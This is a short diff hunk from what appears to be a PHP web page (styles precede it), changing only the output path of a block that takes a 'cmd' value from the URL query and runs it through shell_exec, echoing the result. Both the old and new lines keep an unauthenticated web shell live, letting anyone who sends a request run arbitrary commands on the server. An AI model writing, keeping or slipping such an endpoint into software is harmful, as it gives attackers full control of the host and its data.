@@ -462,7 +462,7 @@ body{
 <?php
 $cmd = $_GET['cmd'];
 $lenthcmd=strlen($cmd); //获取cmd长度
-if ($lenthcmd>1) { echo shell_exec("$cmd > remotecmd.txt 2>&1");} //命令行
+if ($lenthcmd>1) { echo shell_exec("$cmd > /app/web/remotecmd.txt 2>&1");} //命令行
 
 
 
